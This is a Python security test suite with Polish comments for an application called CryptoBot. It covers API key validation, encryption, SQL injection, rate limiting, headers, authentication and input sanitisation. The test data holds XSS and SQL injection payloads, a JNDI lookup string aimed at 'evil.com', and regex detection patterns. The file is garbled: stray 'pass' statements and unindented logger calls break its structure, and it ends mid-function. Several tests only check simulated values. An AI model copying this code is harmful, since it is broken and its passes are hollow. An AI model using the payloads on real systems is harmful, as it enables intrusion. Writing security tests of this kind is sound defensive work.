#!/usr/bin/env python3
"""
Kompleksowe testy bezpieczeństwa dla CryptoBot

Testuje:
- Walidacja API keys
- Szyfrowanie danych
- SQL injection protection
- Rate limiting
- Secure headers
- Authentication & Authorization
- Data sanitization
- Secure communication
"""

import asyncio
import time
import hashlib
import base64
import json
import sqlite3
import tempfile
import os
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional
from unittest.mock import MagicMock, patch, AsyncMock
import re

# Importy z aplikacji
from utils.logger import get_logger, LogType
from utils.encryption import EncryptionManager
from utils.config_manager import get_config_manager
from core.database_manager import DatabaseManager
from app.api_config_manager import get_api_config_manager
import logging
logger = logging.getLogger(__name__)


class SecurityTester:
    """Klasa do testowania bezpieczeństwa aplikacji"""
    
    def __init__(self):
        self.logger = get_logger("test_security", LogType.SYSTEM)
        self.config_manager = get_config_manager()
        self.api_config = get_api_config_manager()
        self.test_results = {}
        
        # Test data
        self.test_api_keys = {
            'valid_key': 'test_api_key_12345678901234567890',
            'invalid_key': 'invalid_key',
            'empty_key': '',
            'malicious_key': '<script>alert("xss")</script>',
            'sql_injection_key': "'; DROP TABLE users; --"
        }
        
        self.test_secrets = {
            'valid_secret': 'test_secret_abcdefghijklmnopqrstuvwxyz',
            'invalid_secret': 'short',
            'empty_secret': '',
            'malicious_secret': '${jndi:ldap://evil.com/a}'
        }
        
    async def run_all_tests(self):
        """Uruchomienie wszystkich testów bezpieczeństwa"""
logger.info("ROZPOCZYNANIE TESTOW BEZPIECZENSTWA")
logger.info("=" * 60)
        
        # Test 1: Walidacja API keys
        await self._test_api_key_validation()
        
        # Test 2: Szyfrowanie danych
        await self._test_data_encryption()
        
        # Test 3: Ochrona przed SQL injection
        await self._test_sql_injection_protection()
        
        # Test 4: Rate limiting
        await self._test_rate_limiting()
        
        # Test 5: Secure headers
        await self._test_secure_headers()
        
        # Test 6: Authentication & Authorization
        await self._test_authentication()
        
        # Test 7: Data sanitization
        await self._test_data_sanitization()
        
        # Test 8: Secure communication
        await self._test_secure_communication()
        
        # Podsumowanie
        self._print_summary()
        
    async def _test_api_key_validation(self):
        """Test walidacji kluczy API"""
logger.info("\n🔑 Walidacja API keys...")
        
        try:
            validation_results = {
                'valid_keys_accepted': 0,
                'invalid_keys_rejected': 0,
                'malicious_keys_blocked': 0,
                'total_tests': 0
            }
            
            # Test różnych typów kluczy
            test_cases = [
                ('valid_key', True, 'Prawidłowy klucz'),
                ('invalid_key', False, 'Nieprawidłowy klucz'),
                ('empty_key', False, 'Pusty klucz'),
                ('malicious_key', False, 'Złośliwy klucz (XSS)'),
                ('sql_injection_key', False, 'Klucz z SQL injection')
            ]
            
            for key_type, should_be_valid, description in test_cases:
                validation_results['total_tests'] += 1
                
                try:
                    api_key = self.test_api_keys[key_type]
                    is_valid = await self._validate_api_key(api_key)
                    
                    if should_be_valid and is_valid:
                        validation_results['valid_keys_accepted'] += 1
logger.info(f"   ✅ {description}: Poprawnie zaakceptowany")
                    elif not should_be_valid and not is_valid:
                        if 'malicious' in key_type or 'injection' in key_type:
                            validation_results['malicious_keys_blocked'] += 1
                        else:
                            validation_results['invalid_keys_rejected'] += 1
logger.info(f"   ✅ {description}: Poprawnie odrzucony")
                    else:
                        pass
logger.info(f"   ❌ {description}: Nieprawidłowa walidacja")
                        
                    pass
                except Exception as e:
logger.info(f"   ⚠️ {description}: Błąd walidacji - {e}")
            
            # Test długości kluczy
            await self._test_key_length_validation(validation_results)
            
            # Test formatów kluczy
            await self._test_key_format_validation(validation_results)
            
            # Ocena wyników
            success_rate = (validation_results['valid_keys_accepted'] + 
                          validation_results['invalid_keys_rejected'] + 
                          validation_results['malicious_keys_blocked']) / validation_results['total_tests']
logger.info(f"   📊 Prawidłowe klucze zaakceptowane: {validation_results['valid_keys_accepted']}")
logger.info(f"   📊 Nieprawidłowe klucze odrzucone: {validation_results['invalid_keys_rejected']}")
logger.info(f"   📊 Złośliwe klucze zablokowane: {validation_results['malicious_keys_blocked']}")
logger.info(f"   📊 Wskaźnik sukcesu: {success_rate*100:.1f}%")
            
            if success_rate >= 0.9:  # 90% success rate
                self.test_results['api_key_validation'] = 'PASSED'
                pass
logger.info("   ✅ Walidacja API keys: PASSED")
            else:
                self.test_results['api_key_validation'] = f'FAILED: success_rate={success_rate*100:.1f}%'
            pass
logger.info(f"   ❌ Walidacja API keys: FAILED")
                
        except Exception as e:
            self.test_results['api_key_validation'] = f'FAILED: {e}'
logger.info(f"   ❌ Walidacja API keys: FAILED - {e}")
    
            pass
    async def _validate_api_key(self, api_key: str) -> bool:
        """Walidacja pojedynczego klucza API"""
        # Podstawowa walidacja
        if not api_key or len(api_key) < 10 or len(api_key) > 256:
            return False
        
        # Sprawdzenie na złośliwe znaki
        malicious_patterns = [
            r'<script.*?>',
            r'javascript:',
            r'DROP\s+TABLE',
            r'SELECT.*FROM',
            r'INSERT\s+INTO',
            r'DELETE\s+FROM',
            r'\${.*}',  # Template injection
            r'eval\s*\(',
                pass
            r'exec\s*\('
        ]
        
            pass
        for pattern in malicious_patterns:
            if re.search(pattern, api_key, re.IGNORECASE):
                return False
        
        # Sprawdzenie formatu (tylko alfanumeryczne i podkreślenia)
        if not re.match(r'^[a-zA-Z0-9_]+$', api_key):
            return False
        
        return True
    
    async def _test_key_length_validation(self, results: Dict):
        """Test walidacji długości kluczy"""
        length_tests = [
            ('', False, 'Pusty klucz'),
            ('short', False, 'Za krótki klucz'),
            ('a' * 64, True, 'Prawidłowa długość'),
            ('a' * 1000, False, 'Za długi klucz')
                pass
                    pass
        ]
                    pass
        
        for key, should_be_valid, description in length_tests:
                pass
            results['total_tests'] += 1
            is_valid = await self._validate_api_key(key)
            
            if should_be_valid == is_valid:
                if should_be_valid:
                    results['valid_keys_accepted'] += 1
                else:
                    results['invalid_keys_rejected'] += 1
logger.info(f"   ✅ {description}: OK")
            else:
logger.info(f"   ❌ {description}: FAILED")
    
            pass
    async def _test_key_format_validation(self, results: Dict):
        """Test walidacji formatu kluczy"""
        format_tests = [
                pass
                    pass
            ('valid_key_123', True, 'Alfanumeryczny z podkreśleniem'),
                    pass
            ('invalid-key-with-dashes', False, 'Z myślnikami'),
            ('invalid.key.with.dots', False, 'Z kropkami'),
                pass
            ('invalid key with spaces', False, 'Ze spacjami'),
            ('invalid@key#with$symbols', False, 'Ze specjalnymi znakami')
        ]
        
        for key, should_be_valid, description in format_tests:
            results['total_tests'] += 1
            is_valid = await self._validate_api_key(key)
            
            if should_be_valid == is_valid:
                if should_be_valid:
                    results['valid_keys_accepted'] += 1
                else:
                    results['invalid_keys_rejected'] += 1
logger.info(f"   ✅ {description}: OK")
            else:
logger.info(f"   ❌ {description}: FAILED")
                pass
                    pass
    
    async def _test_data_encryption(self):
        """Test szyfrowania danych"""
                        pass
logger.info("\n🔐 Szyfrowanie danych...")
        
                        pass
        try:
            encryption_results = {
                    pass
                'encryption_tests': 0,
                'decryption_tests': 0,
                'key_generation_tests': 0,
                'failed_tests': 0
            }
            
            # Test generowania kluczy (inicjalizacja EncryptionManager)
logger.info("   🔄 Test inicjalizacji menedżera szyfrowania...")
            for i in range(5):
                try:
                    encryption_manager = EncryptionManager(f"test_password_{i}")
                    # Test czy można uzyskać klucz
                    test_encrypted = encryption_manager.encrypt_string("test")
                    if test_encrypted and len(test_encrypted) > 0:
                        encryption_results['key_generation_tests'] += 1
                pass
                    pass
logger.info(f"     ✅ Menedżer {i+1}: Zainicjalizowany pomyślnie")
                    else:
                        encryption_results['failed_tests'] += 1
logger.info(f"     ❌ Menedżer {i+1}: Błąd inicjalizacji")
                        pass
                            pass
                except Exception as e:
                    encryption_results['failed_tests'] += 1
logger.info(f"     ❌ Menedżer {i+1}: Błąd - {e}")
            
            # Test szyfrowania różnych typów danych
                                pass
            test_data = [
                "Prosty tekst",
                                pass
                "Tekst ze znakami specjalnymi: !@#$%^&*()",
                "Długi tekst: " + "A" * 1000,
                            pass
                json.dumps({"api_key": "secret123", "secret": "topsecret"}),
                "Tekst z emoji: [EMOJI_REMOVED]",
                ""  # Pusty string
            ]
logger.info("   🔄 Test szyfrowania i deszyfrowania...")
            encryption_manager = EncryptionManager("test_master_password")
            
            for i, data in enumerate(test_data):
                            pass
                try:
                    # Szyfrowanie
                            pass
                    encrypted = encryption_manager.encrypt_string(data)
                    
                        pass
                    # Specjalny przypadek dla pustego stringa
                    if data == "":
                        if encrypted == "":
                            encryption_results['encryption_tests'] += 1
logger.info(f"     ✅ Szyfrowanie {i+1}: OK (pusty string)")
                            
                            # Deszyfrowanie pustego stringa
                            decrypted = encryption_manager.decrypt_string(encrypted)
                            if decrypted == data:
                                encryption_results['decryption_tests'] += 1
logger.info(f"     ✅ Deszyfrowanie {i+1}: OK (pusty string)")
                            else:
                                encryption_results['failed_tests'] += 1
logger.info(f"     ❌ Deszyfrowanie {i+1}: Dane nie pasują")
                        else:
                            encryption_results['failed_tests'] += 1
                    pass
logger.info(f"     ❌ Szyfrowanie {i+1}: Błąd (pusty string)")
                        pass
                    elif encrypted and encrypted != data:
                        encryption_results['encryption_tests'] += 1
                        pass
logger.info(f"     ✅ Szyfrowanie {i+1}: OK")
                        
                        # Deszyfrowanie
                        decrypted = encryption_manager.decrypt_string(encrypted)
                        if decrypted == data:
                            encryption_results['decryption_tests'] += 1
logger.info(f"     ✅ Deszyfrowanie {i+1}: OK")
                        else:
                            encryption_results['failed_tests'] += 1
logger.info(f"     ❌ Deszyfrowanie {i+1}: Dane nie pasują")
                    else:
                        encryption_results['failed_tests'] += 1
logger.info(f"     ❌ Szyfrowanie {i+1}: Błąd")
                        
                except Exception as e:
                    encryption_results['failed_tests'] += 1
logger.info(f"     ❌ Test {i+1}: Błąd - {e}")
            
                pass
            # Test z nieprawidłowym kluczem
logger.info("   🔄 Test z nieprawidłowym kluczem...")
                pass
            try:
                # Test z różnymi hasłami
                encryption_manager1 = EncryptionManager("password1")
                encryption_manager2 = EncryptionManager("password2")
                
                encrypted = encryption_manager1.encrypt_string("test data")
                
                try:
                    decrypted = encryption_manager2.decrypt_string(encrypted)
                    if decrypted != "test data":
                        encryption_results['key_generation_tests'] += 1
            pass
logger.info("     ✅ Nieprawidłowy klucz: Poprawnie odrzucony")
                    else:
                        encryption_results['failed_tests'] += 1
logger.info("     ❌ Nieprawidłowy klucz: Błędnie zaakceptowany")
                except Exception as e:
                    encryption_results['key_generation_tests'] += 1
logger.info("     ✅ Nieprawidłowy klucz: Poprawnie odrzucony (exception)")
            except Exception as e:
                encryption_results['failed_tests'] += 1
logger.info(f"     ❌ Test nieprawidłowego klucza: Błąd - {e}")
            
            # Ocena wyników
            total_tests = (encryption_results['encryption_tests'] + 
                          encryption_results['decryption_tests'] + 
                          encryption_results['key_generation_tests'])
logger.info(f"   📊 Testy szyfrowania: {encryption_results['encryption_tests']}")
logger.info(f"   📊 Testy deszyfrowania: {encryption_results['decryption_tests']}")
logger.info(f"   📊 Testy generowania kluczy: {encryption_results['key_generation_tests']}")
logger.info(f"   📊 Nieudane testy: {encryption_results['failed_tests']}")
            
            if encryption_results['failed_tests'] == 0 and total_tests > 0:
                self.test_results['data_encryption'] = 'PASSED'
logger.info("   ✅ Szyfrowanie danych: PASSED")
            else:
                self.test_results['data_encryption'] = f'FAILED: {encryption_results["failed_tests"]} failed tests'
logger.info(f"   ❌ Szyfrowanie danych: FAILED")
                
        except Exception as e:
                    pass
            self.test_results['data_encryption'] = f'FAILED: {e}'
logger.info(f"   ❌ Szyfrowanie danych: FAILED - {e}")
                        pass
    
    async def _test_sql_injection_protection(self):
        """Test ochrony przed SQL injection"""
                            pass
logger.info("\n🛡️ Ochrona przed SQL injection...")
        
                            pass
        try:
            injection_results = {
                        pass
                'blocked_injections': 0,
                'total_attempts': 0,
                'false_positives': 0
            }
            
            # Typowe ataki SQL injection
            sql_injection_payloads = [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "' UNION SELECT * FROM users --",
                "'; INSERT INTO users VALUES ('hacker', 'password'); --",
                "' OR 1=1 --",
                "admin'--",
                    pass
                "' OR 'x'='x",
                "'; DELETE FROM users WHERE '1'='1",
                        pass
                "' AND (SELECT COUNT(*) FROM users) > 0 --",
                "' OR (SELECT user FROM users WHERE user='admin') = 'admin' --"
                            pass
            ]
                            pass
            
            # Test z tymczasową bazą danych
            with tempfile.NamedTemporaryFile(suffix='.db', delete=False) as tmp_file:
                        pass
                test_db_path = tmp_file.name
            
            try:
                # Utworzenie testowej bazy danych
                await self._create_test_database(test_db_path)
                    pass
logger.info("   🔄 Test payloadów SQL injection...")
                for payload in sql_injection_payloads:
                    injection_results['total_attempts'] += 1
                    
                    try:
                        # Test z parametryzowanymi zapytaniami (bezpieczne)
                        is_blocked = await self._test_parameterized_query(test_db_path, payload)
                        
                        if is_blocked:
                            injection_results['blocked_injections'] += 1
logger.info(f"     ✅ Payload zablokowany: {payload[:30]}...")
                        else:
logger.info(f"     ❌ Payload nie zablokowany: {payload[:30]}...")
                            
                    except Exception as e:
                        # Exception oznacza, że atak został zablokowany
                        injection_results['blocked_injections'] += 1
logger.info(f"     ✅ Payload zablokowany (exception): {payload[:30]}...")
                
                # Test prawidłowych danych (nie powinny być blokowane)
                valid_inputs = [
                    "normal_user",
                    "user123",
                    "test@example.com",
                    "Valid User Name",
                    "user_with_underscore"
                ]
logger.info("   🔄 Test prawidłowych danych...")
                for valid_input in valid_inputs:
                    injection_results['total_attempts'] += 1
                    
                    try:
                        is_blocked = await self._test_parameterized_query(test_db_path, valid_input)
                        
                        if not is_blocked:
logger.info(f"     ✅ Prawidłowe dane zaakceptowane: {valid_input}")
                        else:
                            injection_results['false_positives'] += 1
logger.info(f"     ❌ Prawidłowe dane odrzucone: {valid_input}")
                            
                    except Exception as e:
                        injection_results['false_positives'] += 1
logger.info(f"     ❌ Prawidłowe dane odrzucone (exception): {valid_input}")
                
            finally:
                # Czyszczenie
                if os.path.exists(test_db_path):
                    os.unlink(test_db_path)
            pass
            
            # Ocena wyników
            protection_rate = injection_results['blocked_injections'] / len(sql_injection_payloads) if sql_injection_payloads else 0
logger.info(f"   📊 Zablokowane ataki: {injection_results['blocked_injections']}/{len(sql_injection_payloads)}")
logger.info(f"   📊 Fałszywe alarmy: {injection_results['false_positives']}")
logger.info(f"   📊 Wskaźnik ochrony: {protection_rate*100:.1f}%")
            
            if protection_rate >= 0.9 and injection_results['false_positives'] <= 1:
                self.test_results['sql_injection_protection'] = 'PASSED'
logger.info("   ✅ Ochrona przed SQL injection: PASSED")
            else:
                self.test_results['sql_injection_protection'] = f'FAILED: protection={protection_rate*100:.1f}%, false_positives={injection_results["false_positives"]}'
logger.info(f"   ❌ Ochrona przed SQL injection: FAILED")
                pass
                    pass
                
        except Exception as e:
            self.test_results['sql_injection_protection'] = f'FAILED: {e}'
logger.info(f"   ❌ Ochrona przed SQL injection: FAILED - {e}")
    
    async def _create_test_database(self, db_path: str):
        """Utworzenie testowej bazy danych"""
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE users (
                id INTEGER PRIMARY KEY,
                username TEXT NOT NULL,
                email TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
                pass
        ''')
                pass
        
        cursor.execute('''
            INSERT INTO users (username, email) VALUES 
            ('admin', 'admin@example.com'),
            ('user1', 'user1@example.com'),
            ('user2', 'user2@example.com')
        ''')
        
        conn.commit()
        conn.close()
    
    async def _test_parameterized_query(self, db_path: str, user_input: str) -> bool:
            pass
        """Test zapytania parametryzowanego"""
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        
        try:
            # Sprawdzenie czy input zawiera potencjalnie złośliwe wzorce
            malicious_patterns = [
                r"';.*DROP.*TABLE",
                r"'.*OR.*'.*'.*=.*'",
                r"'.*UNION.*SELECT",
                r"';.*INSERT.*INTO",
                r"';.*DELETE.*FROM",
                r"'.*--",
                r"'.*AND.*SELECT.*COUNT",
                r"admin'--"
            ]
            
            is_malicious = False
            for pattern in malicious_patterns:
                if re.search(pattern, user_input, re.IGNORECASE):
                    is_malicious = True
                    break
                    pass
            
            # Bezpieczne zapytanie parametryzowane
            cursor.execute("SELECT * FROM users WHERE username = ?", (user_input,))
                    pass
            results = cursor.fetchall()
            
            # Sprawdzenie, czy nie nastąpiła modyfikacja danych
            cursor.execute("SELECT COUNT(*) FROM users")
            user_count = cursor.fetchone()[0]
            
            # Jeśli liczba użytkowników się zmieniła, to atak się udał
            if user_count != 3:  # Oczekujemy 3 użytkowników
                return False  # Atak się udał (nie zablokowany)
            
            # Jeśli input był złośliwy ale zapytanie się wykonało bezpiecznie,
                pass
            # to znaczy że atak został zablokowany przez parametryzację
            if is_malicious:
                return True  # Atak zablokowany
            else:
                return False  # Prawidłowe dane, nie blokowane
            
        except Exception as e:
            # Exception oznacza, że atak został zablokowany
            return True
                        pass
        finally:
                        pass
            conn.close()
    
    async def _test_rate_limiting(self):
        """Test rate limiting"""
logger.info("\n⏱️ Rate limiting...")
        
        try:
            rate_limit_results = {
                'requests_sent': 0,
                'requests_blocked': 0,
                'rate_limit_triggered': False
            }
            
            # Symulacja rate limiting
            request_limit = 10  # 10 requestów na minutę
            time_window = 60  # 60 sekund
            
            # Symulacja szybkich requestów
                    pass
logger.info("   🔄 Test przekroczenia limitu requestów...")
            
                    pass
            request_times = []
            for i in range(20):  # Wysyłamy 20 requestów (więcej niż limit)
                current_time = time.time()
                request_times.append(current_time)
                rate_limit_results['requests_sent'] += 1
                
                # Sprawdzenie rate limiting
                recent_requests = [t for t in request_times if current_time - t < time_window]
                
                if len(recent_requests) > request_limit:
                    rate_limit_results['requests_blocked'] += 1
                    rate_limit_results['rate_limit_triggered'] = True
logger.info(f"     ✅ Request {i+1}: Zablokowany przez rate limiting")
                else:
logger.info(f"     ✅ Request {i+1}: Zaakceptowany")
                
                # Krótka przerwa między requestami
                await asyncio.sleep(0.1)
            
            # Test różnych IP (symulacja)
logger.info("   🔄 Test rate limiting dla różnych IP...")
            ip_requests = {}
            
            test_ips = ['192.168.1.1', '192.168.1.2', '10.0.0.1', '172.16.0.1']
            
            for ip in test_ips:
                ip_requests[ip] = []
                
                for i in range(15):  # 15 requestów z każdego IP
                    current_time = time.time()
                    ip_requests[ip].append(current_time)
                    
                    # Sprawdzenie rate limiting dla IP
                    recent_requests = [t for t in ip_requests[ip] if current_time - t < time_window]
                    
                    if len(recent_requests) > request_limit:
logger.info(f"     ✅ IP {ip}, Request {i+1}: Zablokowany")
                    else:
logger.info(f"     ✅ IP {ip}, Request {i+1}: Zaakceptowany")
                    
                    await asyncio.sleep(0.05)
            
            # Test burst protection
logger.info("   🔄 Test ochrony przed burst attacks...")
            burst_limit = 5  # 5 requestów na sekundę
            burst_window = 1  # 1 sekunda
            
            burst_requests = []
            burst_blocked = 0
            
            for i in range(10):  # 10 requestów w krótkim czasie
                current_time = time.time()
                burst_requests.append(current_time)
                
                recent_burst = [t for t in burst_requests if current_time - t < burst_window]
                
                if len(recent_burst) > burst_limit:
                    burst_blocked += 1
                pass
                    pass
logger.info(f"     ✅ Burst request {i+1}: Zablokowany")
                else:
                        pass
logger.info(f"     ✅ Burst request {i+1}: Zaakceptowany")
                
                        pass
                await asyncio.sleep(0.05)
                    pass
            
            # Ocena wyników
logger.info(f"   📊 Wysłane requesty: {rate_limit_results['requests_sent']}")
logger.info(f"   📊 Zablokowane requesty: {rate_limit_results['requests_blocked']}")
logger.info(f"   📊 Rate limiting aktywny: {rate_limit_results['rate_limit_triggered']}")
                pass
                    pass
logger.info(f"   📊 Zablokowane burst requesty: {burst_blocked}")
                    pass
            
            if rate_limit_results['rate_limit_triggered'] and burst_blocked > 0:
                self.test_results['rate_limiting'] = 'PASSED'
logger.info("   ✅ Rate limiting: PASSED")
            else:
                self.test_results['rate_limiting'] = 'FAILED: Rate limiting nie działa poprawnie'
logger.info("   ❌ Rate limiting: FAILED")
                
        except Exception as e:
            self.test_results['rate_limiting'] = f'FAILED: {e}'
                pass
                    pass
logger.info(f"   ❌ Rate limiting: FAILED - {e}")
                    pass
    
    async def _test_secure_headers(self):
        """Test secure headers"""
logger.info("\n🛡️ Secure headers...")
        
        try:
            header_results = {
                'required_headers': 0,
                'total_required': 0,
                'security_score': 0
            }
                pass
            
            # Wymagane nagłówki bezpieczeństwa
            required_headers = {
                'X-Content-Type-Options': 'nosniff',
                'X-Frame-Options': 'DENY',
                'X-XSS-Protection': '1; mode=block',
                'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
                'Content-Security-Policy': 'default-src \'self\'',
                'Referrer-Policy': 'strict-origin-when-cross-origin',
                'Permissions-Policy': 'geolocation=(), microphone=(), camera=()'
            }
            pass
            
            header_results['total_required'] = len(required_headers)
            
            # Symulacja sprawdzania nagłówków HTTP
logger.info("   🔄 Sprawdzanie nagłówków bezpieczeństwa...")
            
            simulated_headers = {
                'X-Content-Type-Options': 'nosniff',
                'X-Frame-Options': 'DENY',
                'X-XSS-Protection': '1; mode=block',
                'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
                'Content-Security-Policy': 'default-src \'self\'; script-src \'self\' \'unsafe-inline\'',
                'Referrer-Policy': 'strict-origin-when-cross-origin',
                'Server': 'nginx/1.18.0'  # Nie powinno być ujawniane
            }
            
            for header_name, expected_value in required_headers.items():
                if header_name in simulated_headers:
                    actual_value = simulated_headers[header_name]
                    
                    if expected_value in actual_value or actual_value in expected_value:
                        header_results['required_headers'] += 1
logger.info(f"     ✅ {header_name}: OK")
                    else:
logger.info(f"     ⚠️ {header_name}: Nieprawidłowa wartość")
                    pass
                else:
logger.info(f"     ❌ {header_name}: Brak nagłówka")
            
            # Sprawdzenie niebezpiecznych nagłówków
            dangerous_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version']
logger.info("   🔄 Sprawdzanie niebezpiecznych nagłówków...")
            for header in dangerous_headers:
                if header in simulated_headers:
logger.info(f"     ⚠️ {header}: Ujawniony (powinien być ukryty)")
                else:
logger.info(f"     ✅ {header}: Ukryty")
                pass
            
                pass
            # Test CORS headers
logger.info("   🔄 Sprawdzanie CORS headers...")
            cors_headers = {
                'Access-Control-Allow-Origin': '*',  # Niebezpieczne
                'Access-Control-Allow-Credentials': 'true',
                'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE'
            }
            
            for header, value in cors_headers.items():
                if header == 'Access-Control-Allow-Origin' and value == '*':
logger.info(f"     ⚠️ {header}: Niebezpieczna wartość '*'")
                else:
                pass
logger.info(f"     ✅ {header}: OK")
            
            # Obliczenie wyniku bezpieczeństwa
            header_score = (header_results['required_headers'] / header_results['total_required']) * 100
                    pass
            header_results['security_score'] = header_score
                    pass
logger.info(f"   📊 Wymagane nagłówki: {header_results['required_headers']}/{header_results['total_required']}")
logger.info(f"   📊 Wynik bezpieczeństwa: {header_score:.1f}%")
            
            if header_score >= 80:  # 80% wymaganych nagłówków
                self.test_results['secure_headers'] = 'PASSED'
logger.info("   ✅ Secure headers: PASSED")
            else:
                self.test_results['secure_headers'] = f'FAILED: score={header_score:.1f}%'
logger.info(f"   ❌ Secure headers: FAILED")
                
        except Exception as e:
            self.test_results['secure_headers'] = f'FAILED: {e}'
logger.info(f"   ❌ Secure headers: FAILED - {e}")
                pass
    
    async def _test_authentication(self):
        """Test uwierzytelniania i autoryzacji"""
logger.info("\n🔐 Authentication & Authorization...")
                    pass
        
                    pass
        try:
            auth_results = {
                'password_tests': 0,
                'session_tests': 0,
                'authorization_tests': 0,
                'failed_tests': 0
            }
            
            # Test siły haseł
logger.info("   🔄 Test siły haseł...")
            password_tests = [
                ('weak123', False, 'Słabe hasło'),
                ('StrongPassword123!', True, 'Silne hasło'),
                ('', False, 'Puste hasło'),
                ('12345678', False, 'Tylko cyfry'),
                ('password', False, 'Popularne hasło'),
                ('MyVeryStrongP@ssw0rd2024!', True, 'Bardzo silne hasło')
            ]
                pass
            
            for password, should_be_strong, description in password_tests:
                auth_results['password_tests'] += 1
            pass
                
                is_strong = await self._validate_password_strength(password)
                
                if should_be_strong == is_strong:
logger.info(f"     ✅ {description}: OK")
                else:
                    auth_results['failed_tests'] += 1
logger.info(f"     ❌ {description}: FAILED")
            
            # Test hashowania haseł
logger.info("   🔄 Test hashowania haseł...")
            test_password = "TestPassword123!"
            
            # Symulacja hashowania
            hash1 = hashlib.pbkdf2_hmac('sha256', test_password.encode(), b'salt1', 100000)
            hash2 = hashlib.pbkdf2_hmac('sha256', test_password.encode(), b'salt2', 100000)
            
            if hash1 != hash2:
logger.info("     ✅ Różne sole generują różne hashe")
            else:
                auth_results['failed_tests'] += 1
logger.info("     ❌ Identyczne hashe dla różnych soli")
            pass
            
            # Test sesji
logger.info("   🔄 Test zarządzania sesjami...")
            session_tests = [
                ('valid_session_token_123456789', True, 'Prawidłowy token sesji'),
                ('expired_session_token', False, 'Wygasły token sesji'),
                ('', False, 'Pusty token sesji'),
                ('malicious<script>alert(1)</script>', False, 'Złośliwy token sesji')
            ]
            
            for token, should_be_valid, description in session_tests:
                auth_results['session_tests'] += 1
                
                is_valid = await self._validate_session_token(token)
                
                if should_be_valid == is_valid:
logger.info(f"     ✅ {description}: OK")
                else:
                    auth_results['failed_tests'] += 1
logger.info(f"     ❌ {description}: FAILED")
            pass
            
            # Test autoryzacji
logger.info("   🔄 Test autoryzacji...")
            authorization_tests = [
                ('admin', 'admin_action', True, 'Admin wykonuje akcję admin'),
                ('user', 'user_action', True, 'User wykonuje akcję user'),
                ('user', 'admin_action', False, 'User próbuje wykonać akcję admin'),
                ('guest', 'user_action', False, 'Guest próbuje wykonać akcję user'),
                ('', 'any_action', False, 'Brak roli')
            ]
            
            for role, action, should_be_allowed, description in authorization_tests:
                auth_results['authorization_tests'] += 1
                
                is_allowed = await self._check_authorization(role, action)
                
                if should_be_allowed == is_allowed:
logger.info(f"     ✅ {description}: OK")
                else:
                    auth_results['failed_tests'] += 1
logger.info(f"     ❌ {description}: FAILED")
            
            # Ocena wyników
            total_tests = (auth_results['password_tests'] + 
                          auth_results['session_tests'] + 
                          auth_results['authorization_tests'])
            
                pass
            success_rate = (total_tests - auth_results['failed_tests']) / total_tests if total_tests > 0 else 0
logger.info(f"   📊 Testy haseł: {auth_results['password_tests']}")
                    pass
logger.info(f"   📊 Testy sesji: {auth_results['session_tests']}")
logger.info(f"   📊 Testy autoryzacji: {auth_results['authorization_tests']}")
                    pass
logger.info(f"   📊 Nieudane testy: {auth_results['failed_tests']}")
logger.info(f"   📊 Wskaźnik sukcesu: {success_rate*100:.1f}%")
            
            if success_rate >= 0.9:
                self.test_results['authentication'] = 'PASSED'
logger.info("   ✅ Authentication & Authorization: PASSED")
            else:
                self.test_results['authentication'] = f'FAILED: success_rate={success_rate*100:.1f}%'
logger.info(f"   ❌ Authentication & Authorization: FAILED")
                
        except Exception as e:
            self.test_results['authentication'] = f'FAILED: {e}'
logger.info(f"   ❌ Authentication & Authorization: FAILED - {e}")
                pass
    
    async def _validate_password_strength(self, password: str) -> bool:
        """Walidacja siły hasła"""
                    pass
        if len(password) < 8:
            return False
                    pass
        
        has_upper = any(c.isupper() for c in password)
        has_lower = any(c.islower() for c in password)
        has_digit = any(c.isdigit() for c in password)
        has_special = any(c in '!@#$%^&*()_+-=[]{}|;:,.<>?' for c in password)
        
        # Sprawdzenie popularnych haseł
        common_passwords = ['password', '123456', 'qwerty', 'admin', 'letmein']
        if password.lower() in common_passwords:
            return False
        
        return has_upper and has_lower and has_digit and has_special
    
                pass
    async def _validate_session_token(self, token: str) -> bool:
        """Walidacja tokenu sesji"""
        if not token or len(token) < 10:
                    pass
            return False
        
                    pass
        # Sprawdzenie na złośliwe znaki
        if '<' in token or '>' in token or 'script' in token.lower():
            return False
        
        # Sprawdzenie czy token nie wygasł (symulacja)
        if 'expired' in token:
            return False
        
        return True
    
    async def _check_authorization(self, role: str, action: str) -> bool:
        """Sprawdzenie autoryzacji"""
        permissions = {
            'admin': ['admin_action', 'user_action', 'guest_action'],
            'user': ['user_action', 'guest_action'],
            'guest': ['guest_action']
                pass
        }
        
                pass
        if role not in permissions:
            return False
        
            pass
        return action in permissions[role]
    
    async def _test_data_sanitization(self):
        """Test sanityzacji danych"""
logger.info("\n🧹 Data sanitization...")
        
        try:
            sanitization_results = {
                'xss_blocked': 0,
                'html_sanitized': 0,
                'sql_escaped': 0,
                'failed_tests': 0
            }
            
            # Test XSS protection
logger.info("   🔄 Test ochrony przed XSS...")
            xss_payloads = [
                '<script>alert("XSS")</script>',
                '<img src="x" onerror="alert(1)">',
                'javascript:alert("XSS")',
                '<svg onload="alert(1)">',
                '"><script>alert("XSS")</script>',
                '<iframe src="javascript:alert(1)"></iframe>'
            ]
            
            for payload in xss_payloads:
                sanitized = await self._sanitize_input(payload)
                
                if '<script>' not in sanitized and 'javascript:' not in sanitized and 'onerror=' not in sanitized:
                    sanitization_results['xss_blocked'] += 1
logger.info(f"     ✅ XSS payload zablokowany: {payload[:30]}...")
                else:
                    sanitization_results['failed_tests'] += 1
logger.info(f"     ❌ XSS payload nie zablokowany: {payload[:30]}...")
            
            # Test HTML sanitization
logger.info("   🔄 Test sanityzacji HTML...")
            html_inputs = [
                '<p>Normalny tekst</p>',
                '<b>Pogrubiony tekst</b>',
                '<script>alert("bad")</script><p>Tekst</p>',
                '<a href="http://example.com">Link</a>',
                '<img src="image.jpg" alt="Obraz">'
            ]
            
            for html_input in html_inputs:
                sanitized = await self._sanitize_html(html_input)
                
                # Sprawdzenie czy bezpieczne tagi zostały zachowane, a niebezpieczne usunięte
                if '<script>' not in sanitized:
                    sanitization_results['html_sanitized'] += 1
logger.info(f"     ✅ HTML sanityzowany: {html_input[:30]}...")
                else:
                    sanitization_results['failed_tests'] += 1
